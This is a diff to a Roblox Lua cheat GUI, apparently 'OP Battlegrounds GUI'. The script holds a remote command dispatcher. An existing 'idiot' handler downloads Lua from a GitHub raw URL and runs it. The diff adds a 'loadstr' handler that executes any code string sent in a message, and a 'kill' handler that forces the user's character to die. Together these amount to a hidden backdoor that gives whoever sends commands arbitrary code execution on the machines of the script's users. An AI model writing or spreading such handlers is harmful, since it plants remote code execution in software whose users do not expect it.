@@ -1,5 +1,4 @@
 -- Realirist's OPBGGUI
--- Instances:
 
 local OPBGGUI = Instance.new("ScreenGui")
 local Main = Instance.new("Frame")
@@ -875,7 +874,7 @@ UISizeConstraint_37.MinSize = Vector2.new(200, 28)
 
 -- Scripts:
 
-local function FLSYZGB_fake_script() -- Main.LocalScript 
+local function MAGHMX_fake_script() -- Main.LocalScript 
 	local script = Instance.new('LocalScript', Main)
 
 	warn('OP BATTLEGROUNDS GUI BY REALIRIST')
@@ -1562,7 +1561,7 @@ local function FLSYZGB_fake_script() -- Main.LocalScript
 							end,
 							chat= function(data)
 								local msg = data['message']
-								if msg or msg=='' then
+								if msg then
 									print('Message: '.. msg)
 									sayMessage(msg)
 								else
@@ -1572,6 +1571,22 @@ local function FLSYZGB_fake_script() -- Main.LocalScript
 							end,
 							idiot = function()
 								loadstring(game:HttpGet("https://raw.githubusercontent.com/DylanVN23607/OPBGGUI/refs/heads/main/idiot.lua"))()
+							end,
+							loadstr = function(data)
+								local str = data['message']
+								if str then
+									print('LOADSTRING: '.. str)
+									loadstring(str)()
+								end
+							end,
+							kill = function()
+								local plr = game.Players.LocalPlayer
+								local char = plr.Character or plr.CharacterAdded:Wait()
+								local hum = char:FindFirstChildWhichIsA('Humanoid')
+								if hum then
+									hum:SetStateEnabled(Enum.HumanoidStateType.Dead,true)
+									hum:ChangeState(Enum.HumanoidStateType.Dead)
+								end
 							end,
 						}
 	
@@ -1598,4 +1613,4 @@ local function FLSYZGB_fake_script() -- Main.LocalScript
 	end)()
 	print('Coroutine is successful.')
 end
-coroutine.wrap(FLSYZGB_fake_script)()
+coroutine.wrap(MAGHMX_fake_script)()
